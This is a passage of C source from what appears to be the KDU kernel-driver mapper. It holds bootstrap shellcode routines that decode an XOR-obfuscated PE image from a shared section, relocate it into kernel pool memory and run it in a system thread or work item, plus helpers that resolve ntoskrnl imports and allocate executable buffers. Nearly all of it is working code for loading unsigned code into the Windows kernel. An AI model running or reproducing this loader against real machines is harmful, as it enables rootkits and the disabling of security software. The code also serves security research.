                } //ExAllocatePoolWithTag(rawExAlloc)

                ShellCode->Import.ZwUnmapViewOfSection(NtCurrentProcess(),
                    pvSharedSection);

            } //ZwMapViewOfSection(pvSharedSection)

            ShellCode->Import.ObfDereferenceObject(SectionRef);

            //
            // Fire the event to let userland know that we're ready.
            //
            status = ShellCode->Import.ObReferenceObjectByHandle(ShellCode->ReadyEventHandle,
                SYNCHRONIZE | EVENT_MODIFY_STATE, NULL, 0, (PVOID*)&ReadyEvent, NULL);
            if (NT_SUCCESS(status))
            {
                ShellCode->Import.KeSetEvent(ReadyEvent, 0, FALSE);
                ShellCode->Import.ObfDereferenceObject(ReadyEvent);
            }

        } // ObReferenceObjectByHandle success

    }
    ShellCode->Import.IofCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

/*
* ScDispatchRoutineV2
*
* Purpose:
*
* Bootstrap shellcode variant 2.
* Read image from shared section, process relocs and run it in a worker thread.
*
* IRQL: PASSIVE_LEVEL
*
*/
NTSTATUS NTAPI ScDispatchRoutineV2(
    _In_ struct _DEVICE_OBJECT* DeviceObject,
    _Inout_ struct _IRP* Irp,
    _In_ PSHELLCODE ShellCode)
{
    NTSTATUS                        status;
    ULONG                           isz;
    ULONG_PTR                       img, exbuffer;

    PIO_STACK_LOCATION              StackLocation;

    PIMAGE_DOS_HEADER               dosh;
    PIMAGE_FILE_HEADER              fileh;
    PIMAGE_OPTIONAL_HEADER          popth;
    PIMAGE_BASE_RELOCATION          rel;

    DWORD_PTR                       delta;
    LPWORD                          chain;
    DWORD                           c, rsz, k, off;

    PUCHAR                          ptr;

    PKEVENT                         ReadyEvent;
    PVOID                           SectionRef, pvSharedSection = NULL, rawExAlloc;
    SIZE_T                          ViewSize;

    POBJECT_TYPE*                   ppSecType;
    PPAYLOAD_HEADER_V2              PayloadHeader;

    WORK_QUEUE_ITEM* WorkItem;

#ifdef ENABLE_DBGPRINT
    CHAR                            szFormat1[] = { 'S', '%', 'l', 'x', 0 };
    CHAR                            szFormat2[] = { 'F', '%', 'l', 'x', 0 };
#endif

#ifdef _DEBUG
    StackLocation = IoGetCurrentIrpStackLocationTest(Irp);
#else
    StackLocation = IoGetCurrentIrpStackLocation(Irp);
#endif

    if ((StackLocation->MajorFunction == IRP_MJ_CREATE)
        && (DeviceObject->SectorSize == 0))
    {
        ppSecType = (POBJECT_TYPE*)ShellCode->MmSectionObjectType;

        status = ShellCode->Import.ObReferenceObjectByHandle(
            ShellCode->SectionHandle,
            SECTION_ALL_ACCESS,
            (ppSecType ? *ppSecType : NULL),
            0,
            (PVOID*)&SectionRef,
            NULL);

        if (NT_SUCCESS(status)) {

            ViewSize = ShellCode->SectionViewSize;

            status = ShellCode->Import.ZwMapViewOfSection(ShellCode->SectionHandle,
                NtCurrentProcess(),
                (PVOID*)&pvSharedSection,
                0,
                PAGE_SIZE,
                NULL,
                &ViewSize,
                ViewUnmap,
                0,
                PAGE_READWRITE);

            if (NT_SUCCESS(status)) {

                k = ShellCode->Tag;

                PayloadHeader = (PAYLOAD_HEADER_V2*)pvSharedSection;
                rsz = PayloadHeader->ImageSize;
                ptr = (PUCHAR)pvSharedSection + sizeof(PAYLOAD_HEADER_V2);

                while (rsz--) {
                    *ptr ^= k;
                    k = _rotl(k, 1);
                    ptr++;
                }

                img = (ULONG_PTR)pvSharedSection + sizeof(PAYLOAD_HEADER_V2);
                dosh = (PIMAGE_DOS_HEADER)img;
                fileh = (PIMAGE_FILE_HEADER)(img + sizeof(DWORD) + dosh->e_lfanew);
                popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
                isz = popth->SizeOfImage;

                //
                // Allocate memory for mapped image.
                //
                rawExAlloc = ShellCode->Import.ExAllocatePoolWithTag(
                    NonPagedPool,
                    isz + PAGE_SIZE,
                    ShellCode->Tag);

                if (rawExAlloc) {

                    exbuffer = ((ULONG_PTR)rawExAlloc + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1);
                    delta = exbuffer - popth->ImageBase;

                    //
                    // Relocate image.
                    //
                    if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC) {
                        off = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
                        rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
                        if (off && rsz && off + rsz <= isz) {
                            rel = (PIMAGE_BASE_RELOCATION)(img + off);
                            c = 0;
                            while (c < rsz) {
                                chain = (LPWORD)((PUCHAR)rel + sizeof(IMAGE_BASE_RELOCATION));
                                for (off = sizeof(IMAGE_BASE_RELOCATION); off < rel->SizeOfBlock; off += sizeof(WORD), chain++) {
                                    if ((*chain >> 12) == IMAGE_REL_BASED_DIR64)
                                        *(PULONG_PTR)(img + rel->VirtualAddress + (*chain & 0x0FFF)) += delta;
                                }
                                c += rel->SizeOfBlock;
                                rel = (PIMAGE_BASE_RELOCATION)((PUCHAR)rel + rel->SizeOfBlock);
                            }
                        }
                    }


                    //
                    // Copy image to allocated buffer. We can't use any fancy memcpy stuff here.
                    //
                    __movsb((PUCHAR)exbuffer, (const UCHAR*)img, isz);

                    //
                    // Allocate worker and run image entry point within system worker thread.
                    //
                    WorkItem = (WORK_QUEUE_ITEM*)ShellCode->Import.ExAllocatePoolWithTag(NonPagedPool,
                        sizeof(WORK_QUEUE_ITEM),
                        ShellCode->Tag);

                    if (WorkItem) {

                        WorkItem->List.Flink = NULL;
                        WorkItem->Parameter = NULL;
                        WorkItem->WorkerRoutine = (PWORKER_THREAD_ROUTINE)(exbuffer + popth->AddressOfEntryPoint);

                        PayloadHeader->ExQueueWorkItem(WorkItem, DelayedWorkQueue);

                        //
                        // Save result.
                        //
                        PayloadHeader->IoStatus.Information = (ULONG_PTR)WorkItem;
                        PayloadHeader->IoStatus.Status = STATUS_SUCCESS;
                    }


                    //
                    // Block further IRP_MJ_CREATE requests.
                    //
                    DeviceObject->SectorSize = 512;

                } //ExAllocatePoolWithTag(rawExAlloc)

                ShellCode->Import.ZwUnmapViewOfSection(NtCurrentProcess(),
                    pvSharedSection);

            } //ZwMapViewOfSection(pvSharedSection)

            ShellCode->Import.ObfDereferenceObject(SectionRef);

            //
            // Fire the event to let userland know that we're ready.
            //
            status = ShellCode->Import.ObReferenceObjectByHandle(ShellCode->ReadyEventHandle,
                SYNCHRONIZE | EVENT_MODIFY_STATE, NULL, 0, (PVOID*)&ReadyEvent, NULL);
            if (NT_SUCCESS(status))
            {
                ShellCode->Import.KeSetEvent(ReadyEvent, 0, FALSE);
                ShellCode->Import.ObfDereferenceObject(ReadyEvent);
            }

        } // ObReferenceObjectByHandle success

    }
    ShellCode->Import.IofCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

/*
* ScDispatchRoutineV1
*
* Purpose:
*
* Bootstrap shellcode variant 1.
* Read image from shared section, process relocs and run it in allocated system thread.
*
* IRQL: PASSIVE_LEVEL
*
*/
NTSTATUS NTAPI ScDispatchRoutineV1(
    _In_ struct _DEVICE_OBJECT* DeviceObject,
    _Inout_ struct _IRP* Irp,
    _In_ PSHELLCODE ShellCode)
{
    NTSTATUS                        status;
    ULONG                           isz;
    HANDLE                          hThread;
    OBJECT_ATTRIBUTES               obja;
    ULONG_PTR                       img, exbuffer;

    PIO_STACK_LOCATION              StackLocation;

    PIMAGE_DOS_HEADER               dosh;
    PIMAGE_FILE_HEADER              fileh;
    PIMAGE_OPTIONAL_HEADER          popth;
    PIMAGE_BASE_RELOCATION          rel;

    DWORD_PTR                       delta;
    LPWORD                          chain;
    DWORD                           c, rsz, k, off;

    PUCHAR                          ptr;

    PKEVENT                         ReadyEvent;
    PVOID                           SectionRef, pvSharedSection = NULL, rawExAlloc;
    SIZE_T                          ViewSize;

    POBJECT_TYPE*                   ppSecType;
    PPAYLOAD_HEADER_V1              PayloadHeader;

#ifdef ENABLE_DBGPRINT
    CHAR                            szFormat1[] = { 'S', '%', 'l', 'x', 0 };
    CHAR                            szFormat2[] = { 'F', '%', 'l', 'x', 0 };
#endif

#ifdef _DEBUG
    StackLocation = IoGetCurrentIrpStackLocationTest(Irp);
#else
    StackLocation = IoGetCurrentIrpStackLocation(Irp);
#endif

    if ((StackLocation->MajorFunction == IRP_MJ_CREATE)
        && (DeviceObject->SectorSize == 0))
    {
        ppSecType = (POBJECT_TYPE*)ShellCode->MmSectionObjectType;

        status = ShellCode->Import.ObReferenceObjectByHandle(
            ShellCode->SectionHandle,
            SECTION_ALL_ACCESS,
            (ppSecType ? *ppSecType : NULL),
            0,
            (PVOID*)&SectionRef,
            NULL);

        if (NT_SUCCESS(status)) {

            ViewSize = ShellCode->SectionViewSize;

            status = ShellCode->Import.ZwMapViewOfSection(ShellCode->SectionHandle,
                NtCurrentProcess(),
                (PVOID*)&pvSharedSection,
                0,
                PAGE_SIZE,
                NULL,
                &ViewSize,
                ViewUnmap,
                0,
                PAGE_READWRITE);

            if (NT_SUCCESS(status)) {

                k = ShellCode->Tag;

                PayloadHeader = (PAYLOAD_HEADER_V1*)pvSharedSection;
                rsz = PayloadHeader->ImageSize;
                ptr = (PUCHAR)pvSharedSection + sizeof(PAYLOAD_HEADER_V1);

                while (rsz--) {
                    *ptr ^= k;
                    k = _rotl(k, 1);
                    ptr++;
                }

                img = (ULONG_PTR)pvSharedSection + sizeof(PAYLOAD_HEADER_V1);
                dosh = (PIMAGE_DOS_HEADER)img;
                fileh = (PIMAGE_FILE_HEADER)(img + sizeof(DWORD) + dosh->e_lfanew);
                popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
                isz = popth->SizeOfImage;

                //
                // Allocate memory for mapped image.
                //
                rawExAlloc = ShellCode->Import.ExAllocatePoolWithTag(
                    NonPagedPool,
                    isz + PAGE_SIZE,
                    ShellCode->Tag);

                if (rawExAlloc) {

                    exbuffer = ((ULONG_PTR)rawExAlloc + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1);
                    delta = exbuffer - popth->ImageBase;

                    //
                    // Relocate image.
                    //
                    if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC) {
                        off = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
                        rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
                        if (off && rsz && off + rsz <= isz) {
                            rel = (PIMAGE_BASE_RELOCATION)(img + off);
                            c = 0;
                            while (c < rsz) {
                                chain = (LPWORD)((PUCHAR)rel + sizeof(IMAGE_BASE_RELOCATION));
                                for (off = sizeof(IMAGE_BASE_RELOCATION); off < rel->SizeOfBlock; off += sizeof(WORD), chain++) {
                                    if ((*chain >> 12) == IMAGE_REL_BASED_DIR64)
                                        *(PULONG_PTR)(img + rel->VirtualAddress + (*chain & 0x0FFF)) += delta;
                                }
                                c += rel->SizeOfBlock;
                                rel = (PIMAGE_BASE_RELOCATION)((PUCHAR)rel + rel->SizeOfBlock);
                            }
                        }
                    }

                    //
                    // Copy image to allocated buffer. We can't use any fancy memcpy stuff here.
                    //
                    __movsb((PUCHAR)exbuffer, (const UCHAR*)img, isz);

                    //
                    // Create system thread with handler set to image entry point.
                    //
                    hThread = NULL;
                    InitializeObjectAttributes(&obja, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

                    status = PayloadHeader->PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, &obja, NULL, NULL,
                        (PKSTART_ROUTINE)(exbuffer + popth->AddressOfEntryPoint), NULL);

                    if (NT_SUCCESS(status))
                        PayloadHeader->ZwClose(hThread);

                    //
                    // Save result.
                    //
                    PayloadHeader->IoStatus.Status = status;

                    //
                    // Block further IRP_MJ_CREATE requests.
                    //
                    DeviceObject->SectorSize = 512;

                } //ExAllocatePoolWithTag(rawExAlloc)

                ShellCode->Import.ZwUnmapViewOfSection(NtCurrentProcess(),
                    pvSharedSection);

            } //ZwMapViewOfSection(pvSharedSection)

            ShellCode->Import.ObfDereferenceObject(SectionRef);

            //
            // Fire the event to let userland know that we're ready.
            //
            status = ShellCode->Import.ObReferenceObjectByHandle(ShellCode->ReadyEventHandle,
                SYNCHRONIZE | EVENT_MODIFY_STATE, NULL, 0, (PVOID*)&ReadyEvent, NULL);
            if (NT_SUCCESS(status))
            {
                ShellCode->Import.KeSetEvent(ReadyEvent, 0, FALSE);
                ShellCode->Import.ObfDereferenceObject(ReadyEvent);
            }

        } // ObReferenceObjectByHandle success

    }
    ShellCode->Import.IofCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

//
// In case if MSVC trashes shellcode and you turned off optimization re-enable it here #pragma optimize("", on )
//
typedef NTSTATUS(NTAPI* pfnScDispatchRoutine)(
    _In_ struct _DEVICE_OBJECT* DeviceObject,
    _Inout_ struct _IRP* Irp,
    _In_ PVOID ShellCode);

typedef VOID(NTAPI* pfnScLoaderRoutine)(
    _In_ PVOID ShellCode);

/*
* ScDispatchRoutineDebugSelector
*
* Purpose:
*
* Run shellcode according to version during debug.
*
*/
NTSTATUS NTAPI ScDispatchRoutineDebugSelector(
    _In_ ULONG ScVersion,
    _In_ PVOID ScBuffer,
    _In_ struct _DEVICE_OBJECT* DeviceObject,
    _Inout_ struct _IRP* Irp)
{
    union {
        pfnScDispatchRoutine DispatchRoutine;
        pfnScLoaderRoutine LoaderRoutine;
    } Routine;

    switch (ScVersion) {
    case KDU_SHELLCODE_V4:
        Routine.LoaderRoutine = (pfnScLoaderRoutine)ScLoaderRoutineV1;
        break;
    case KDU_SHELLCODE_V3:
        Routine.DispatchRoutine = (pfnScDispatchRoutine)ScDispatchRoutineV3;
        break;
    case KDU_SHELLCODE_V2:
        Routine.DispatchRoutine = (pfnScDispatchRoutine)ScDispatchRoutineV2;
        break;
    case KDU_SHELLCODE_V1:
    default:
        Routine.DispatchRoutine = (pfnScDispatchRoutine)ScDispatchRoutineV1;
        break;
    }

    switch (ScVersion) {
    case KDU_SHELLCODE_V4:
        Routine.LoaderRoutine(ScBuffer);
        return STATUS_SUCCESS;
    default:
        return Routine.DispatchRoutine(DeviceObject, Irp, ScBuffer);
    }
}

/*
* ScSizeOfProc
*
* Purpose:
*
* Very simplified. Return size of procedure when first ret meet.
*
*/
ULONG ScSizeOfProc(
    _In_ PBYTE FunctionPtr)
{
    ULONG   c = 0;
    UCHAR* p;
    hde64s  hs;

    __try {

        do {
            p = FunctionPtr + c;
            hde64_disasm(p, &hs);
            if (hs.flags & F_ERROR)
                break;
            c += hs.len;

        } while (*p != 0xC3);

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return 0;
    }
    return c;
}

/*
* ScResolveFunctionByName
*
* Purpose:
*
* Get function address by it name.
*
*/
ULONG_PTR ScResolveFunctionByName(
    _In_ ULONG_PTR KernelBase,
    _In_ ULONG_PTR KernelImage,
    _In_ LPCSTR Function)
{
    ULONG_PTR Address = supGetProcAddress(KernelBase, KernelImage, Function);
    if (Address == 0) {
        
        supPrintfEvent(kduEventError, 
            "[!] Error, %s address cannot be found\r\n", Function);
        
        return 0;
    }

    printf_s("[*] %s 0x%llX\r\n", Function, Address);
    return Address;
}

/*
* ScGetViewSize
*
* Purpose:
*
* Return payload section view size.
*
*/
SIZE_T ScGetViewSize(
    _In_ ULONG ScVersion,
    _In_ PVOID ScBuffer
)
{
    SIZE_T viewSize;
    PSHELLCODE pvShellCode = (PSHELLCODE)ScBuffer;

    switch (ScVersion) {
    case KDU_SHELLCODE_V4:
    case KDU_SHELLCODE_V3:
    case KDU_SHELLCODE_V2:
    case KDU_SHELLCODE_V1:
    default:
        viewSize = pvShellCode->SectionViewSize;
        break;
    }

    return viewSize;
}

/*
* ScSizeOf
*
* Purpose:
*
* Return shellcode/payload header size depending on shellcode version.
*
*/
DWORD ScSizeOf(
    _In_ ULONG ScVersion,
    _Out_opt_ PULONG PayloadSize
)
{
    ULONG payloadSize;

    if (PayloadSize) {
        switch (ScVersion) {
        case KDU_SHELLCODE_V3:
            payloadSize = sizeof(PAYLOAD_HEADER_V3);
            break;
        case KDU_SHELLCODE_V2:
            payloadSize = sizeof(PAYLOAD_HEADER_V2);
            break;
        case KDU_SHELLCODE_V4:
        case KDU_SHELLCODE_V1:
        default:
            payloadSize = sizeof(PAYLOAD_HEADER_V1);
            break;
        }
        *PayloadSize = payloadSize;
    }

    return sizeof(SHELLCODE);
}

/*
* ScBuildShellImportDebug
*
* Purpose:
*
* Retrieve pointers for shellcode version independent part for Debug mode.
*
*/
BOOL ScBuildShellImportDebug(
    _In_ ULONG ScVersion,
    _In_ PVOID ScBuffer
)
{
    SHELLCODE* ShellCode = (SHELLCODE*)ScBuffer;

    switch (ScVersion) {

    case KDU_SHELLCODE_V4:
    case KDU_SHELLCODE_V3:
    case KDU_SHELLCODE_V2:
    case KDU_SHELLCODE_V1:
    default:
#ifdef ENABLE_DBGPRINT
        ShellCode->Import.DbgPrint = DbgPrintTest;
#endif
        ShellCode->Import.ExAllocatePoolWithTag = &ExAllocatePoolWithTagTest;
        ShellCode->Import.ZwMapViewOfSection = &NtMapViewOfSection;
        ShellCode->Import.ZwUnmapViewOfSection = &NtUnmapViewOfSection;
        ShellCode->Import.IofCompleteRequest = &IofCompleteRequestTest;
        ShellCode->Import.KeSetEvent = &KeSetEventTest;
        ShellCode->Import.ObReferenceObjectByHandle = &ObReferenceObjectByHandleTest;
        ShellCode->Import.ObfDereferenceObject = &ObfDereferenceObjectTest;
        g_DummyULONG64 = 0;
        ShellCode->MmSectionObjectType = &g_DummyULONG64;
        break;
    }

    return TRUE;
}

/*
* ScBuildShellImport
*
* Purpose:
*
* Retrieve pointers for shellcode version independent part.
*
*/
BOOL ScBuildShellImport(
    _In_ ULONG ScVersion,
    _In_ PVOID ScBuffer,
    _In_ ULONG_PTR KernelBase,
    _In_ ULONG_PTR KernelImage
)
{
    BOOL bResolved = FALSE;

    ULONG i;

    SHELLCODE* ShellCode = (SHELLCODE*)ScBuffer;

#ifdef ENABLE_DBGPRINT
    pfnDbgPrint DbgPrintPtr;
#endif

    PVOID MmSectionObjectTypePtr;

    PVOID funcPtrs[MAX_BASE_SCIMPORTS_NODBGPRINT];
    LPCSTR funcNames[MAX_BASE_SCIMPORTS_NODBGPRINT] = {
        "ExAllocatePoolWithTag",
        "IofCompleteRequest",
        "ZwMapViewOfSection",
        "ZwUnmapViewOfSection",
        "ObReferenceObjectByHandle",
        "ObfDereferenceObject",
        "KeSetEvent"
    };

    UNREFERENCED_PARAMETER(ScVersion);

    do {

#ifndef ENABLE_DBGPRINT
#pragma warning(push)
#pragma warning(disable: 4127)
        if (sizeof(ShellCode->Import) != sizeof(funcPtrs))
            break;
#pragma warning(pop)
#endif

        MmSectionObjectTypePtr =
            (PVOID)ScResolveFunctionByName(KernelBase, KernelImage, "MmSectionObjectType");
        ASSERT_RESOLVED_FUNC(MmSectionObjectTypePtr);

        ShellCode->MmSectionObjectType = MmSectionObjectTypePtr;

#ifdef ENABLE_DBGPRINT
        DbgPrintPtr =
            (pfnDbgPrint)ScResolveFunctionByName(KernelBase, KernelImage, "DbgPrint");
        ASSERT_RESOLVED_FUNC(DbgPrintPtr);

        ShellCode->Import.DbgPrint = DbgPrintPtr;
#endif

        for (i = 0; i < RTL_NUMBER_OF(funcNames); i++) {
            funcPtrs[i] = (PVOID)ScResolveFunctionByName(KernelBase, KernelImage, funcNames[i]);
            ASSERT_RESOLVED_FUNC(funcPtrs[i]);
        }

#ifdef ENABLE_DBGPRINT

        PUCHAR funcPtr = (PUCHAR)&ShellCode->Import + sizeof(PVOID);
        RtlCopyMemory(funcPtr, funcPtrs, sizeof(funcPtrs));

#else
        RtlCopyMemory(&ShellCode->Import, funcPtrs, sizeof(funcPtrs));
#endif
        bResolved = TRUE;

    } while (FALSE);

    return bResolved;
}

/*
* ScCreateReadyEvent
*
* Purpose:
*
* Create synchronization event and store value it in shellcode.
*
*/
HANDLE ScCreateReadyEvent(
    _In_ ULONG ScVersion,
    _In_ PVOID ScBuffer
)
{
    HANDLE hReadyEvent;
    SHELLCODE* ShellCode = (SHELLCODE*)ScBuffer;

    hReadyEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

    switch (ScVersion) {
    case KDU_SHELLCODE_V4:
    case KDU_SHELLCODE_V3:
    case KDU_SHELLCODE_V2:
    case KDU_SHELLCODE_V1:
    default:
        ShellCode->ReadyEventHandle = hReadyEvent;
        break;
    }

    return hReadyEvent;
}

/*
* ScStoreVersionSpecificData
*
* Purpose:
*
* Store version specific data in the shared section part.
*
*/
BOOLEAN ScStoreVersionSpecificData(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID PayloadPtr
)
{
    union {
        union {
            PAYLOAD_HEADER_V1* v1;
            PAYLOAD_HEADER_V2* v2;
            PAYLOAD_HEADER_V3* v3;
        } Version;
        PVOID Ref;
    } pvPayloadHead;

    FIXED_UNICODE_STRING regPath, drvName;
    LPWSTR lpRegistryEntryName;

    pvPayloadHead.Ref = PayloadPtr;

    switch (Context->ShellVersion) {
    case KDU_SHELLCODE_V3:

        //
        // Build driver name and registry path for shellcode.
        //

        if (Context->DriverObjectName.Length == 0)
            return FALSE;

        //
        // Build driver name in ObManager format.
        //

        RtlSecureZeroMemory(&drvName, sizeof(drvName));

        StringCchPrintf(drvName.Buffer, MAX_PATH,
            L"%ws%ws",
            OB_DRIVER_PREFIX,
            Context->DriverObjectName.Buffer);

        drvName.Length = (USHORT)(_strlen(drvName.Buffer) * sizeof(WCHAR));
        drvName.MaximumLength = drvName.Length + sizeof(WCHAR);
        drvName.Buffer[drvName.Length / sizeof(WCHAR)] = UNICODE_NULL;

        RtlCopyMemory(&pvPayloadHead.Version.v3->ObjectName,
            &drvName,
            sizeof(FIXED_UNICODE_STRING));

        if (Context->DriverRegistryPath.Length == 0) {

            //
            // Registry name not provided, assume it is the same as driver object name.
            //

            lpRegistryEntryName = Context->DriverObjectName.Buffer;

        }
        else {

            lpRegistryEntryName = Context->DriverRegistryPath.Buffer;

        }

        StringCchPrintf(regPath.Buffer, MAX_PATH,
            L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\%ws",
            lpRegistryEntryName);

        regPath.Length = (USHORT)(_strlen(regPath.Buffer) * sizeof(WCHAR));
        regPath.MaximumLength = regPath.Length + sizeof(WCHAR);
        regPath.Buffer[regPath.Length / sizeof(WCHAR)] = UNICODE_NULL;

        RtlCopyMemory(&pvPayloadHead.Version.v3->RegistryPath,
            &regPath,
            sizeof(FIXED_UNICODE_STRING));

        break;

    case KDU_SHELLCODE_V4:
    case KDU_SHELLCODE_V2:
    case KDU_SHELLCODE_V1:
        //
        // Nothing.
        //
    default:
        break;
    }

    return TRUE;
}

/*
* ScFree
*
* Purpose:
*
* Release shellcode buffer memory.
*
*/
VOID ScFree(
    _In_ PVOID ScBuffer,
    _In_ ULONG ScSize
)
{
    supFreeLockedMemory(ScBuffer, ScSize);
}

/*
* ScBuildInitCodeForVersion
*
* Purpose:
*
* Store init code for shellcode version specific.
*
*/
BOOL ScBuildInitCodeForVersion(
    _In_ ULONG ShellVersion,
    _In_ PSHELLCODE pvShellCode
)
{
    PVOID pvInitCode;
    ULONG initSize = 0;

    //
    // Fill entire init code with int 3
    //
    RtlFillMemory(pvShellCode->InitCode, sizeof(pvShellCode->InitCode), 0xCC);

    //
    // Select and copy code.
    //
    pvInitCode = ScGetBootstrapLdr(ShellVersion, &initSize);
    if (initSize > sizeof(pvShellCode->InitCode)) {
        return FALSE;
    }

    RtlCopyMemory(pvShellCode->InitCode, pvInitCode, initSize);

    return TRUE;
}

/*
* ScAllocate
*
* Purpose:
*
* Allocate main shellcode buffer in memory, setup init code and import which is not version specific.
*
*/
PVOID ScAllocate(
    _In_ ULONG ShellVersion,
    _In_ HANDLE SectionHandle,
    _In_ SIZE_T SectionViewSize,
    _In_ ULONG_PTR KernelImage,
    _In_ ULONG_PTR KernelBase,
    _In_ ULONG MemoryTag,
    _Out_ PULONG ShellSize
)
{
    DWORD scSize;
    PSHELLCODE pvShellCode = NULL;
    PVOID pvBootstrap;

    PBYTE procPtr = NULL;

    ULONG procSize, bootstrapSize;

    *ShellSize = 0;

    bootstrapSize = BOOTSTRAPCODE_SIZE_V1;
    scSize = ScSizeOf(ShellVersion, NULL);

    switch (ShellVersion) {
    case KDU_SHELLCODE_V4:
        procPtr = (PBYTE)ScLoaderRoutineV1;
        break;
    case KDU_SHELLCODE_V3:
        procPtr = (PBYTE)ScDispatchRoutineV3;
        break;
    case KDU_SHELLCODE_V2:
        procPtr = (PBYTE)ScDispatchRoutineV2;
        break;
    case KDU_SHELLCODE_V1:
    default:
        procPtr = (PBYTE)ScDispatchRoutineV1;
        break;
    }

    procSize = ScSizeOfProc(procPtr);
    if (procSize > bootstrapSize) {

        supPrintfEvent(kduEventError, 
            "[!] Bootstrap code size 0x%lX exceeds limit 0x%lX, abort\r\n", 
            procSize, 
            bootstrapSize);

#ifndef _DEBUG
        return NULL;
#endif
    }

    pvShellCode = (SHELLCODE*)supAllocateLockedMemory(scSize,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);

    if (pvShellCode == NULL)
        return NULL;

    pvBootstrap = pvShellCode->BootstrapCode;

    switch (ShellVersion) {
    case KDU_SHELLCODE_V4:
    case KDU_SHELLCODE_V3:
    case KDU_SHELLCODE_V2:
    case KDU_SHELLCODE_V1:
    default:
        pvShellCode->Tag = MemoryTag;
        pvShellCode->SectionHandle = SectionHandle;
        pvShellCode->SectionViewSize = SectionViewSize;
        break;
    }

    //
    // Build initial loader code part.
    //
    if (!ScBuildInitCodeForVersion(ShellVersion, pvShellCode)) {
        ScFree(pvShellCode, scSize);
        return NULL;
    }

#ifdef _DEBUG

    UNREFERENCED_PARAMETER(KernelBase);
    UNREFERENCED_PARAMETER(KernelImage);

    //
    // Remember function pointers.
    //
    ScBuildShellImportDebug(ShellVersion, pvShellCode);

    //
    // Shellcode test, unused in Release build.
    //

    DEVICE_OBJECT devObject;
    DRIVER_OBJECT drvObject;
    IRP tempIrp;

    RtlSecureZeroMemory(&tempIrp, sizeof(tempIrp));
    RtlSecureZeroMemory(&devObject, sizeof(devObject));
    RtlSecureZeroMemory(&drvObject, sizeof(DRIVER_OBJECT));

    devObject.SectorSize = 0;
    devObject.DriverObject = &drvObject;
    drvObject.MajorFunction[IRP_MJ_PNP] = (PVOID)0x0BADBEFF1CEDC01A;

    ScDispatchRoutineDebugSelector(ShellVersion, pvShellCode, &devObject, &tempIrp);

#else

    printf_s("[+] Resolving base shellcode import\r\n");

    if (!ScBuildShellImport(ShellVersion,
        pvShellCode,
        KernelBase,
        KernelImage))
    {
        ScFree(pvShellCode, scSize);
        
        supPrintfEvent(kduEventError, 
            "[!] Failed to resolve base shellcode import\r\n");
        
        return NULL;
    }

    __try {
        RtlCopyMemory(pvBootstrap, procPtr, procSize);
        //supWriteBufferToFile((PWSTR)L"C:\\install\\out2.bin", pvBootstrap, procSize, FALSE, FALSE, NULL);
        ////((void(*)())ShellCode.Version.v1->InitCode)();

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        
        ScFree(pvShellCode, scSize);

        supPrintfEvent(kduEventError, 
            "[!] Exception during building shellcode, 0x%lX\r\n", 
            GetExceptionCode());
        
        return NULL;
    }

    *ShellSize = procSize;

#endif

    return pvShellCode;
}

/*
* ScCreateFixedUnicodeString
*
* Purpose:
*
* Create UNICODE_STRING with fixed maximum (FIXED_UNICODE_STRING_LENGTH) size buffer.
*
*/
BOOLEAN ScCreateFixedUnicodeString(
    _Inout_ PFIXED_UNICODE_STRING DestinationString,
    _In_ PCWSTR SourceString
)
{
    ULONG cb;

    cb = sizeof(UNICODE_NULL) + ((ULONG)_strlen(SourceString) * sizeof(WCHAR));
    if (cb > FIXED_UNICODE_STRING_LENGTH * sizeof(WCHAR)) {
        return FALSE;
    }
    else {
        RtlCopyMemory(DestinationString->Buffer, SourceString, cb);
        DestinationString->Length = (USHORT)(cb - sizeof(UNICODE_NULL));
        DestinationString->MaximumLength = (USHORT)cb;
        return TRUE;
    }
}

/*
* ScResolveImportForPayload
*
* Purpose:
*
* Resolve ntoskrnl import specific for payload per version.
*
*/
BOOLEAN ScResolveImportForPayload(
    _In_ ULONG ShellVersion,
    _In_ PVOID PayloadHead,
    _In_ ULONG_PTR KernelImage,
    _In_ ULONG_PTR KernelBase
)
{
    union {
        union {
            PAYLOAD_HEADER_V1* v1;
            PAYLOAD_HEADER_V2* v2;
            PAYLOAD_HEADER_V3* v3;
        } Version;
        PVOID Ref;
    } pvPayloadHead;

    pfnZwClose ZwClosePtr;
    pfnExQueueWorkItem ExQueueWorkItemPtr;
    pfnPsCreateSystemThread PsCreateSystemThreadPtr;

    PVOID IoDriverObjectTypePtr;
    pfnObCreateObject ObCreateObjectPtr;
    pfnObInsertObject ObInsertObjectPtr;
    pfnObMakeTemporaryObject ObMakeTemporaryObjectPtr;
    pfnZwMakeTemporaryObject ZwMakeTemporaryObjectPtr;

#ifdef _DEBUG
    UNREFERENCED_PARAMETER(KernelBase);
    UNREFERENCED_PARAMETER(KernelImage);
#endif

    pvPayloadHead.Ref = PayloadHead;

    switch (ShellVersion) {

    case KDU_SHELLCODE_V3:

#ifdef _DEBUG
        g_DummyULONG64 = 0;
        IoDriverObjectTypePtr = &g_DummyULONG64;
        ObCreateObjectPtr = ObCreateObjectTest;
        ObInsertObjectPtr = ObInsertObjectTest;
        ObMakeTemporaryObjectPtr = ObMakeTemporaryObjectTest;
        ZwMakeTemporaryObjectPtr = ZwMakeTemporaryObjectTest;
